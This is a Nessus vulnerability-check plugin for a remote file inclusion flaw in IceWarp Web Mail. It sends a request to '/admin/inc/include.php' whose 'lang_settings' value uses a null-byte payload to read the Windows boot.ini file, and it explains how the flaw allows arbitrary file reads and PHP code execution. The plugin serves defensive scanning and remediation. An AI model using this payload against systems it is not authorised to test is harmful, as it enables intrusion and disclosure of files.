#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(22079);
  script_version("$Revision: 1.16 $");
  script_cvs_date("$Date: 2015/09/24 21:08:40 $");

  script_cve_id("CVE-2006-0817", "CVE-2006-0818");
  script_bugtraq_id(19007, 19002);
  script_osvdb_id(27328, 27330);

  script_name(english:"IceWarp Multiple Script Remote File Inclusion");
  script_summary(english:"Tries to read a local file using IceWarp");
 
  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is prone to
remote file include attacks.");
  script_set_attribute(attribute:"description", value:
"The remote host is running IceWarp Web Mail, a webmail product written
in PHP that is distributed as a standalone application and is also
bundled with VisNetic Mail Server and Merak Mail Server. 

The version of IceWarp Web Mail installed on the remote host fails to
sanitize user-supplied input to the 'lang_settings' parameter of the
'accounts/inc/include.php' and 'admin/inc/include.php' scripts before
using it to include PHP code.  An unauthenticated attacker may be able
to exploit these flaws to view arbitrary files on the remote host or
to execute arbitrary PHP code, for example, after injecting it into
the mail server's log file. 

In addition, the /mail/settings.html script has been reported vulnerable
to a traversal issue via the 'language' parameter. However, Nessus has
not checked for this.");
  script_set_attribute(attribute:"see_also", value:"http://secunia.com/secunia_research/2006-12/advisory/");
  script_set_attribute(attribute:"see_also", value:"http://secunia.com/secunia_research/2006-14/advisory/");
  script_set_attribute(attribute:"solution", value:
"Upgrade to IceWarp Web Mail 5.6.1 / Merak Mail Server 8.3.8.r /
VisNetic Mail Server 8.5.0.5 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:P/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"plugin_publication_date", value: "2006/07/20");
  script_set_attribute(attribute:"vuln_publication_date", value: "2006/07/17");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:icewarp:webmail");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006-2015 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_require_ports("Services/www", 4096, 32000);
  script_require_keys("www/PHP");
  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:32000);
if (!can_host_php(port:port)) exit(0);


# Unless we're being paranoid, make sure the banner belongs to IceWarp.
if (report_paranoia < 2)
{
  banner = get_http_banner(port:port);
  if (!banner || "IceWarp" >!< banner) exit(0);
}


# Try to exploit the flaw to read a file.
#
# nb: while the software does run under Linux, the code in securepath()
#     doesn't allow values for lang_settings that start with a '/' or
#     contain directory traversal sequences so trying to read /etc/passwd,
#     say, is useless.
file = "C:\\boot.ini%00";
r = http_send_recv3(method:"GET", 
  item:string(
    "/admin/inc/include.php?",
    "language=0&",
    "lang_settings[0][1]=", file
  ),
  port:port
);
if (isnull(r)) exit(0);
res = r[2];

# There's a problem if looks like boot.ini.
if ("[boot loader]">< res) {
  report = string(
    "Here are the contents of the file '\\boot.ini' that Nessus\n",
    "was able to read from the remote host :\n",
    "\n",
    res
  );
  security_warning(port:port, extra:report);
  exit(0);
}

